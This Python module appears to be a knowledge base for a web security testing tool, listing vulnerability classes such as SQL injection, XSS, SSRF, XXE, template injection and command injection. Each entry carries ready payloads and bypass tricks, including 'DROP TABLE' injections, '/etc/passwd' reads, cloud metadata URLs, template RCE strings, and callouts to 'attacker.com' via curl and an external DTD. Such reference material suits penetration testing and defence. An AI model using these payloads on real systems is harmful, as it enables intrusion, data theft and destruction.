
import logging
from typing import List, Dict

logger = logging.getLogger(__name__)

SECURITY_KNOWLEDGE: List[Dict[str, str]] = [
    # ── SQL Injection ──
    {
        "category": "sqli",
        "title": "SQL Injection Detection and Exploitation",
        "content": (
            "SQL Injection (CWE-89) occurs when user input is concatenated into SQL queries without "
            "parameterization. Test with payloads: ' OR 1=1--, ' UNION SELECT NULL--, '; DROP TABLE--, "
            "1' AND '1'='1, ' OR ''=', admin'--. Boolean-based blind: ' AND 1=1-- vs ' AND 1=2--. "
            "Time-based blind: '; WAITFOR DELAY '0:0:5'--, ' OR SLEEP(5)--. "
            "Error-based: ' AND extractvalue(1,concat(0x7e,version()))--. "
            "Detection: look for SQL error messages (syntax error, unclosed quotation, ORA-, PG::), "
            "time delays in response, different response lengths for true/false conditions. "
            "Common vulnerable parameters: id, user, search, sort, order, filter, category, page."
        ),
    },
    {
        "category": "sqli",
        "title": "Advanced SQL Injection Bypass Techniques",
        "content": (
            "WAF bypass techniques for SQL injection: Case alternation (sElEcT), inline comments "
            "(SEL/**/ECT), double URL encoding (%2527), unicode normalization, null bytes (%00'), "
            "hex encoding (0x27 for quote), concat function bypass (CHAR(39) for quote). "
            "Second-order SQLi: payload stored in DB, triggered when admin views data. "
            "Out-of-band: ' UNION SELECT load_file('/etc/passwd')--, DNS exfil via LOAD_FILE. "
            "NoSQL injection for MongoDB: {$gt:''}, {$ne:null}, {$regex:'.*'}. "
            "PostgreSQL-specific: '; COPY (SELECT '') TO PROGRAM 'cmd'--, pg_sleep(5)."
        ),
    },
    # ── XSS ──
    {
        "category": "xss",
        "title": "Cross-Site Scripting Detection and Payloads",
        "content": (
            "XSS (CWE-79) injects malicious scripts into web pages. Three types: Reflected (input "
            "echoed in response), Stored (persisted in DB), DOM-based (client-side JS manipulation). "
            "Basic payloads: <script>alert(1)</script>, <img src=x onerror=alert(1)>, "
            "<svg onload=alert(1)>, \"><script>alert(1)</script>, javascript:alert(1). "
            "Filter bypass: <ScRiPt>alert(1)</ScRiPt>, <img/src=x onerror=alert(1)>, "
            "<svg/onload=alert(1)>, <body onload=alert(1)>, <input onfocus=alert(1) autofocus>, "
            "&#x3C;script&#x3E;, data:text/html,<script>alert(1)</script>. "
            "DOM XSS sinks: document.write(), innerHTML, eval(), setTimeout(), location.href. "
            "DOM XSS sources: location.hash, location.search, document.referrer, postMessage. "
            "Detection: inject unique string (e.g. xss_probe_12345), check if reflected unescaped."
        ),
    },
    # ── CSRF ──
    {
        "category": "csrf",
        "title": "Cross-Site Request Forgery Testing",
        "content": (
            "CSRF (CWE-352) forces authenticated users to execute unwanted actions. Test by: "
            "1) Check for CSRF tokens in forms (hidden inputs, custom headers). "
            "2) Check SameSite cookie attribute (None=vulnerable, Lax=partial, Strict=protected). "
            "3) Check Referer/Origin header validation. "
            "4) Try removing CSRF token from request — does server reject? "
            "5) Try reusing old CSRF token — does server accept? "
            "6) Try submitting request from different origin. "
            "State-changing endpoints without CSRF protection are vulnerable: password change, "
            "email change, fund transfer, account deletion, privilege escalation."
        ),
    },
    # ── IDOR ──
    {
        "category": "idor",
        "title": "Insecure Direct Object Reference Testing",
        "content": (
            "IDOR (CWE-639) allows accessing other users' resources by manipulating identifiers. "
            "Test: 1) Find endpoints with numeric/UUID IDs: /api/users/123, /orders/456. "
            "2) Authenticate as user A, note resource IDs. "
            "3) Try accessing user B's resources with user A's session. "
            "4) Try sequential ID enumeration: /api/users/1, /api/users/2, etc. "
            "5) Check both horizontal (same role, different user) and vertical (different role) access. "
            "6) Test all HTTP methods: GET (view), PUT (modify), DELETE (remove). "
            "7) Check API responses for leaked data even on 403 (partial IDOR). "
            "Common locations: user profiles, orders, invoices, messages, files, settings."
        ),
    },
    # ── SSRF ──
    {
        "category": "ssrf",
        "title": "Server-Side Request Forgery Detection",
        "content": (
            "SSRF (CWE-918) makes the server fetch attacker-controlled URLs. "
            "Test parameters that accept URLs: url=, redirect=, next=, link=, src=, image=, feed=. "
            "Payloads: http://127.0.0.1, http://localhost, http://[::1], http://169.254.169.254 "
            "(AWS metadata), http://metadata.google.internal (GCP), http://0x7f000001, "
            "http://2130706433 (decimal IP), http://0177.0.0.1 (octal), file:///etc/passwd. "
            "Bypass filters: URL shorteners, DNS rebinding, double URL encoding, "
            "IPv6 embedding (http://[::ffff:127.0.0.1]), domain with 127.0.0.1 DNS. "
            "Cloud metadata endpoints: AWS IMDSv1 (http://169.254.169.254/latest/meta-data/), "
            "GCP (http://metadata.google.internal/computeMetadata/v1/), "
            "Azure (http://169.254.169.254/metadata/instance?api-version=2021-02-01)."
        ),
    },
    # ── XXE ──
    {
        "category": "xxe",
        "title": "XML External Entity Injection",
        "content": (
            "XXE (CWE-611) exploits XML parsers that process external entity references. "
            "Test any endpoint accepting XML/SOAP input. "
            "Basic payload: <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"
            "<root>&xxe;</root>. "
            "Blind XXE via OOB: <!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%dtd;. "
            "Error-based XXE: <!ENTITY xxe SYSTEM 'file:///nonexistent'>. "
            "SSRF via XXE: <!ENTITY xxe SYSTEM 'http://internal-server/'>. "
            "Detection: send XML with entity reference, check if resolved in response or "
            "causes DNS/HTTP callback. Look for XML parsing errors in responses."
        ),
    },
    # ── JWT ──
    {
        "category": "jwt",
        "title": "JWT Security Testing",
        "content": (
            "JWT vulnerabilities (CWE-345): 1) Algorithm confusion: change RS256 to HS256, "
            "sign with public key as HMAC secret. 2) None algorithm: set alg to 'none', "
            "remove signature. 3) Weak secret: brute-force with common passwords/wordlists. "
            "4) Missing expiration: tokens without exp claim never expire. "
            "5) Key injection via jwk/jku headers. 6) Kid injection: ../../../dev/null. "
            "7) Claim tampering: change sub, role, admin fields after decoding. "
            "Tools: jwt.io for decode, jwt_tool for automated testing. "
            "Detection: decode token (base64), check algorithm, try alg:none, check exp claim."
        ),
    },
    # ── Path Traversal ──
    {
        "category": "path_traversal",
        "title": "Path Traversal / Local File Inclusion",
        "content": (
            "Path traversal (CWE-22) accesses files outside intended directory. "
            "Payloads: ../../../etc/passwd, ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts, "
            "....//....//etc/passwd (double encoding), %2e%2e%2f%2e%2e%2f, "
            "..%252f..%252f (double URL encode), ..%c0%af (UTF-8 overlong). "
            "Windows targets: ....\\\\....\\\\boot.ini, C:\\Windows\\win.ini. "
            "LFI to RCE: include log files (/var/log/apache2/access.log with PHP in User-Agent), "
            "include /proc/self/environ, include uploaded files. "
            "Common parameters: file=, path=, template=, page=, include=, doc=, folder=, style=."
        ),
    },
    # ── File Upload ──
    {
        "category": "file_upload",
        "title": "Unrestricted File Upload Testing",
        "content": (
            "File upload vulnerabilities (CWE-434): 1) Upload web shell (.php, .jsp, .aspx). "
            "2) Bypass extension filters: .php5, .phtml, .php.jpg, .php%00.jpg, .PhP. "
            "3) Bypass content-type check: set Content-Type to image/jpeg for .php file. "
            "4) Bypass magic bytes: prepend GIF89a to PHP file. "
            "5) SVG with XSS: <svg onload=alert(1)>. "
            "6) Polyglot files: valid image AND valid PHP. "
            "7) .htaccess upload to enable PHP execution in upload directory. "
            "8) Race condition: upload then access before validation deletes. "
            "Test: upload file, find uploaded path, try to execute. Check max file size, "
            "filename sanitization, directory listing on upload folder."
        ),
    },
    # ── Authentication ──
    {
        "category": "auth",
        "title": "Authentication Bypass Techniques",
        "content": (
            "Authentication testing: 1) Default credentials (admin:admin, admin:password, root:root). "
            "2) Credential stuffing with leaked databases. 3) Password spraying common passwords. "
            "4) Brute force with rate limiting check. 5) Account lockout policy testing. "
            "6) Session fixation: set session cookie before auth, check if same after auth. "
            "7) Session hijacking: check cookie flags (HttpOnly, Secure, SameSite). "
            "8) OAuth misconfiguration: open redirect in callback, state parameter missing. "
            "9) 2FA bypass: check if 2FA can be skipped by direct API call. "
            "10) Password reset: token predictability, token reuse, host header injection. "
            "11) Registration: check for mass assignment (role=admin in registration body)."
        ),
    },
    # ── CORS ──
    {
        "category": "cors",
        "title": "CORS Misconfiguration Testing",
        "content": (
            "CORS misconfigurations (CWE-942) allow cross-origin data theft. "
            "Test: 1) Send Origin: https://evil.com header, check Access-Control-Allow-Origin. "
            "2) Reflected origin: if ACAO reflects request Origin, check for credentials. "
            "3) Null origin: Origin: null — some configs whitelist null. "
            "4) Subdomain trust: try Origin: https://evil.target.com. "
            "5) Wildcard with credentials: ACAO: * with Access-Control-Allow-Credentials: true "
            "is invalid per spec but some servers misconfigure. "
            "6) Check preflight (OPTIONS) responses for overly permissive allowed methods/headers. "
            "Impact: read sensitive data from authenticated endpoints cross-origin."
        ),
    },
    # ── Information Disclosure ──
    {
        "category": "info_disclosure",
        "title": "Information Disclosure Detection",
        "content": (
            "Information disclosure reveals sensitive data through: "
            "1) Error messages with stack traces, DB queries, internal paths. "
            "2) Debug endpoints: /debug, /trace, /console, /actuator, /phpinfo.php. "
            "3) Source code in responses: comments with credentials, API keys in JS. "
            "4) Directory listing enabled on web server. "
            "5) Backup files: .bak, .old, .swp, ~, .git, .svn, .env. "
            "6) HTTP headers leaking: Server, X-Powered-By, X-AspNet-Version. "
            "7) robots.txt and sitemap.xml revealing hidden paths. "
            "8) API documentation (Swagger/OpenAPI) exposing internal endpoints. "
            "9) EXIF data in uploaded images. "
            "10) Verbose 404/500 error pages with technology information."
        ),
    },
    # ── Business Logic ──
    {
        "category": "business_logic",
        "title": "Business Logic Vulnerability Testing",
        "content": (
            "Business logic flaws exploit application workflow: "
            "1) Price manipulation: modify price in client-side request. "
            "2) Quantity manipulation: negative quantities, zero-price items. "
            "3) Coupon/discount abuse: reuse coupons, stack discounts, apply to wrong items. "
            "4) Race conditions: simultaneous requests for limited resources (TOCTOU). "
            "5) Workflow bypass: skip required steps (payment before verification). "
            "6) Privilege escalation: modify role/permissions in profile update. "
            "7) Rate limit bypass: rotate IPs, modify headers, change case. "
            "8) Feature abuse: use password reset to enumerate users. "
            "9) Insufficient validation: modify hidden form fields, tamper with state."
        ),
    },
    # ── Command Injection ──
    {
        "category": "cmdi",
        "title": "OS Command Injection",
        "content": (
            "Command injection (CWE-78) executes arbitrary OS commands. "
            "Payloads: ; id, | id, || id, && id, ` id `, $(id), %0a id, \\n id. "
            "Blind detection: ; sleep 5, | ping -c 5 attacker.com, || curl attacker.com. "
            "Common vulnerable functions: system(), exec(), popen(), passthru(), "
            "subprocess.call() (Python), Runtime.exec() (Java). "
            "Common injection points: filename parameters, IP/hostname fields, "
            "diagnostic tools (ping, traceroute, DNS lookup), file operations, "
            "email sending (SMTP header injection), PDF generation. "
            "Filter bypass: ${IFS} instead of space, $'\\x20', {echo,hello}, "
            "base64 encoding: echo YWlk|base64 -d|bash."
        ),
    },
    # ── SSTI ──
    {
        "category": "ssti",
        "title": "Server-Side Template Injection",
        "content": (
            "SSTI (CWE-1336) injects into server-side template engines. "
            "Detection payloads: {{7*7}} (Jinja2/Twig), ${7*7} (FreeMarker), "
            "#{7*7} (Ruby ERB), {{7*'7'}} (Jinja2 returns 7777777). "
            "Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. "
            "Twig RCE: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}. "
            "FreeMarker: <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex('id')}. "
            "Test any field that renders user input in HTML templates: names, comments, "
            "email templates, PDF generation, custom pages."
        ),
    },
    # ── Mass Assignment ──
    {
        "category": "mass_assignment",
        "title": "Mass Assignment / Parameter Pollution",
        "content": (
            "Mass assignment (CWE-915) occurs when APIs bind request parameters directly to "
            "internal objects without filtering. Test: 1) Add extra fields to PUT/POST body: "
            "role=admin, is_admin=true, verified=true, balance=99999. "
            "2) Check if additional fields are persisted by fetching the resource. "
            "3) Try GraphQL mutations with extra fields. "
            "4) HTTP parameter pollution: send same param twice with different values. "
            "Common targets: user registration, profile update, settings endpoints. "
            "Look for: role, admin, superuser, verified, approved, balance, credits, "
            "discount, price, permissions, access_level fields."
        ),
    },
    # ── Security Headers ──
    {
        "category": "headers",
        "title": "Security Headers Analysis",
        "content": (
            "Missing security headers indicate defense-in-depth gaps. "
            "Required headers: Content-Security-Policy (prevent XSS), "
            "X-Content-Type-Options: nosniff (prevent MIME sniffing), "
            "X-Frame-Options: DENY/SAMEORIGIN (prevent clickjacking), "
            "Strict-Transport-Security: max-age=31536000; includeSubDomains (force HTTPS), "
            "Referrer-Policy: strict-origin-when-cross-origin (prevent referrer leakage), "
            "Permissions-Policy (restrict browser features). "
            "Anti-patterns: Access-Control-Allow-Origin: * with credentials, "
            "X-Powered-By header revealing technology, Server header revealing version."
        ),
    },
    # ── Cryptography ──
    {
        "category": "crypto",
        "title": "Cryptographic Weakness Detection",
        "content": (
            "Cryptographic weaknesses: 1) Weak TLS: SSLv3, TLS 1.0, TLS 1.1 (deprecated). "
            "2) Weak ciphers: RC4, DES, 3DES, MD5-based MACs, export ciphers. "
            "3) Missing certificate validation, self-signed certs in production. "
            "4) Weak password hashing: MD5, SHA1, unsalted hashes. Require bcrypt/argon2. "
            "5) Predictable tokens/session IDs: insufficient entropy. "
            "6) Hardcoded encryption keys in source code. "
            "7) ECB mode usage (patterns visible in ciphertext). "
            "8) Padding oracle: systematic padding errors leak plaintext. "
            "9) Insecure random: Math.random() for security tokens."
        ),
    },
    # ── Open Redirect ──
    {
        "category": "open_redirect",
        "title": "Open Redirect Vulnerability Testing",
        "content": (
            "Open redirect (CWE-601) redirects users to attacker-controlled sites. "
            "Test parameters: redirect=, url=, next=, return=, goto=, continue=, "
            "callback=, forward=, dest=, rurl=, target=. "
            "Payloads: //evil.com, /\\evil.com, https://evil.com, "
            "//evil.com%2f%2f, /%09/evil.com, javascript:alert(1), "
            "https://target.com@evil.com, data:text/html,<script>alert(1)</script>. "
            "Impact: phishing, OAuth token theft, XSS via javascript: URLs. "
            "Used as SSRF primitive in some cases."
        ),
    },
    # ── Rate Limiting ──
    {
        "category": "rate_limiting",
        "title": "Rate Limiting and Brute Force Protection",
        "content": (
            "Missing rate limiting enables brute force attacks. "
            "Test: 1) Login endpoint: try 100+ rapid login attempts. "
            "2) Password reset: try resetting multiple accounts rapidly. "
            "3) OTP/2FA: try all possible OTP codes (000000-999999). "
            "4) API endpoints: check for rate limiting headers (X-RateLimit-*). "
            "5) Registration: mass account creation. "
            "Bypass techniques: IP rotation, X-Forwarded-For header manipulation, "
            "case variation in username, adding spaces/dots to email, "
            "using different API versions of same endpoint."
        ),
    },
    # ── GraphQL ──
    {
        "category": "graphql",
        "title": "GraphQL Security Testing",
        "content": (
            "GraphQL attack surface: 1) Introspection: {__schema{types{name,fields{name}}}} — "
            "reveals entire schema. 2) Batch queries: send multiple queries in one request. "
            "3) Deep nesting: {user{friends{friends{friends...}}}} — DoS via complexity. "
            "4) Field suggestions: send wrong field name, server suggests valid ones. "
            "5) Authorization bypass: access fields your role shouldn't see. "
            "6) Injection: inject into string arguments (SQLi, XSS through GraphQL). "
            "7) Alias-based batching: {a:user(id:1){email} b:user(id:2){email}} to "
            "enumerate users. Disable introspection in production."
        ),
    },
    # ── WebSocket ──
    {
        "category": "websocket",
        "title": "WebSocket Security Testing",
        "content": (
            "WebSocket vulnerabilities: 1) Missing origin validation: connect from any origin. "
            "2) Missing authentication: connect without tokens. "
            "3) Injection: send SQLi/XSS payloads via WebSocket messages. "
            "4) Cross-Site WebSocket Hijacking: if no origin check, attacker page can "
            "connect to victim's WebSocket using their cookies. "
            "5) Message manipulation: intercept and modify WebSocket frames. "
            "6) Denial of service: send large messages, open many connections. "
            "Test with: browser devtools, wscat, Burp Suite WebSocket tab."
        ),
    },
    # ── Prototype Pollution ──
    {
        "category": "prototype_pollution",
        "title": "JavaScript Prototype Pollution",
        "content": (
            "Prototype pollution (CWE-1321) modifies Object.prototype in JavaScript apps. "
            "Payloads: {\"__proto__\":{\"admin\":true}}, {\"constructor\":{\"prototype\":{\"isAdmin\":true}}}. "
            "Test any endpoint that merges/deep-copies JSON objects. "
            "Impact: privilege escalation, RCE in Node.js (via child_process gadgets), "
            "XSS (pollute innerHTML-related properties). "
            "Detection: send __proto__ in JSON body, check if server behavior changes "
            "or if response includes polluted properties. "
            "Client-side: check JS libraries using recursive merge (lodash.merge, jQuery.extend)."
        ),
    },
    # ── NoSQL Injection ──
    {
        "category": "nosqli",
        "title": "NoSQL Injection Testing",
        "content": (
            "NoSQL injection bypasses authentication and extracts data from MongoDB/CouchDB. "
            "MongoDB payloads: {\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}, "
            "{\"$ne\":null}, {\"$regex\":\".*\"}, {\"$where\":\"this.password.length>0\"}. "
            "URL-encoded: username[$ne]=&password[$ne]= (Express.js query string parsing). "
            "Blind extraction: {\"$regex\":\"^a\"} iterating characters. "
            "Common targets: login forms, search queries, filter parameters on Node.js/Express apps. "
            "Detection: send $gt, $ne operators in JSON body or URL params, "
            "check if authentication bypassed or different data returned."
        ),
    },
]


def get_all_knowledge() -> List[Dict[str, str]]:
    return SECURITY_KNOWLEDGE


def get_knowledge_by_category(category: str) -> List[Dict[str, str]]:
    return [k for k in SECURITY_KNOWLEDGE if k["category"] == category]


def get_categories() -> List[str]:
    return sorted(set(k["category"] for k in SECURITY_KNOWLEDGE))
